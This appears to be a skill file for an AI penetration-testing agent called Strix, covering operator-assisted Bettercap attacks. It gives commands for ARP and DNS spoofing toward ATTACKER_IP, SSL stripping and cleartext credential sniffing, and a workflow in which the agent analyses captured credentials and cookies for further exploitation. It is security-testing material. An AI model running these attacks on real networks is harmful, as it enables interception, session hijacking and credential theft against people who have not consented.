---
name: bettercap
description: Operator-assisted Bettercap workflows for network MITM attacks, traffic sniffing, and protocol manipulation
category: tools
tags: [network, mitm, sniffing, spoofing, operator-assisted]
---

# Bettercap

Network attack and monitoring framework for MITM, ARP spoofing, DNS spoofing, SSL stripping, and credential sniffing. Swiss army knife for network-level attacks.

## When to Request

- When positioned on the same network for MITM attacks
- For ARP spoofing to intercept traffic between hosts
- DNS spoofing to redirect traffic to attacker-controlled servers
- SSL stripping to downgrade HTTPS connections
- Network reconnaissance and host discovery

## Operator-Assisted Workflow

1. Agent identifies network topology and MITM objectives
2. Agent provides Bettercap caplets or interactive commands
3. Operator runs Bettercap and reports captured credentials, traffic, and results
4. Agent analyzes intercepted data for credentials, tokens, and sensitive information
5. Agent uses findings for targeted application exploitation

## Key Commands

### Network Recon
```
bettercap -iface INTERFACE
> net.probe on
> net.show
> net.sniff on
```

### ARP Spoofing
```
> set arp.spoof.targets TARGET_IP
> arp.spoof on
> net.sniff on
```

### DNS Spoofing
```
> set dns.spoof.domains target.com,*.target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on
```

### SSL Stripping (hstshijack caplet)
```
> set hstshijack.targets target.com
> hstshijack/hstshijack
```

### Credential Sniffing
```
> set net.sniff.verbose true
> set net.sniff.filter "tcp port 80 or tcp port 21 or tcp port 25"
> net.sniff on
```

### Caplet Files
```
# Save as attack.cap
net.probe on
set arp.spoof.targets TARGET_IP
arp.spoof on
net.sniff on

# Run with: bettercap -iface INTERFACE -caplet attack.cap
```

## Output Analysis

- **Intercepted credentials** -- HTTP, FTP, SMTP, POP3 cleartext passwords
- **Session cookies** -- session hijacking opportunities for web applications
- **DNS queries** -- reveal internal service names and browsing patterns
- **HTTPS downgrade success** -- indicates missing HSTS or HSTS preload
- **Network topology** -- host discovery reveals all active devices and services

## Integration with Strix

- Intercepted credentials and cookies feed into authenticated Strix testing
- DNS spoofing can redirect targets to Strix-monitored infrastructure
- Network topology discovery expands the scope for service enumeration
- SSL stripping findings document transport security weaknesses

## Operator Help

To provide tool output for this request, save the full command output to the
HIL inbox file indicated by the agent:

```
strix/hil/inbox/resp_<TASK_ID>.txt
```

You can also pipe output directly:

```
bettercap [OPTIONS] TARGET > strix/hil/inbox/resp_<TASK_ID>.txt
```

The agent will automatically detect and parse the response.  See the
`HIL_INBOX_PATH` environment variable to customise the inbox location.
